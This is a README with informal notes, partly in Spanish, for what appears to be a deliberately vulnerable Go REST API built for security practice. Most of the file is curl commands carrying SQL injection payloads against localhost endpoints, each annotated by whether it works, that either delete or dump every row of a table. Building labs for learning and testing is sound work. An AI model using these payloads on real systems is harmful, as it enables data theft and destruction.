# go-vulnerable-api

A deliberately vulnerable REST API built in Go that demonstrates common security vulnerabilities including SQL Injection (SQLi) and Insecure Direct Object Reference (IDOR).



## Run Application

    docker-compose down -v --rmi all
    docker-compose up --build -d


## Payloads

- Deberia permitir listar solo 1 registro y permite listarlos todos


- Permite eliminar informacion de la tabla instruments


- sqlmap


- IDOR



##

Pendiente actualizar dependencias de pgx

CLI Scaffolding

con certificados
sin certificados


- DELETE

curl -k -X DELETE "http://localhost:8080/instruments/vulnerable-sqli?id=16' OR ''='"    NO FUNCIONA

curl -k -X DELETE "http://localhost:8081/instruments/vulnerable-sqli?id=16'OR''='"    SI FUNCIONA

    curl -k -X DELETE "https://localhost:8080/instruments/vulnerable-sqli?id=3%27%20OR%20%27%27=%27"    SI FUNCIONA



curl -k -X DELETE "http://localhost:8080/instruments/vulnerable-sqli?id=3\' OR \'\'=\'"  NO FUNCIONA

curl -k -X DELETE 'http://localhost:8080/instruments/vulnerable-sqli?id=3'\'' OR '\'''\''='\'  NO FUNCIONA


> El parámetro --data-urlencode hace automáticamente la codificación URL por ti, así que no tienes que preocuparte por escribir %27, %20, etc.

curl -k -X DELETE -G "http://localhost:8080/instruments/vulnerable-sqli" \
  --data-urlencode "id=3' OR ''='"   SI FUNCIONA



- GET

curl -X GET "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16"


curl -k -X GET "https://localhost:8081/instruments/vulnerable-sqligetinst?id=16%27%20OR%20%27%27=%27"  (RECUPERA TODAS LAS FILAS)


curl -k -GET "http://localhost:8081/instruments/vulnerable-sqligetinst" \
  --data-urlencode "id=16' OR ''='"


curl "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16' OR ''='" NO FUNCIONA POR LOS ESPACIOS

curl "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16'OR''='" SI FUNCIONA


curl "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16'+OR+''='" SI FUNCIONA

**Con Curl funciona con el payload codificado con parametro o codificacion manual.**
**Recordar que eran los espacios**





### IDOR

- Requiere crea endpoint de submit, 


contexto
propietario del libro

/books/v1 ??




## Modificaciones


GetInstrumentByIDSQLiURLParam

curl -k "localhost:8081/instruments/vulnerable-sqligetinst?id=1"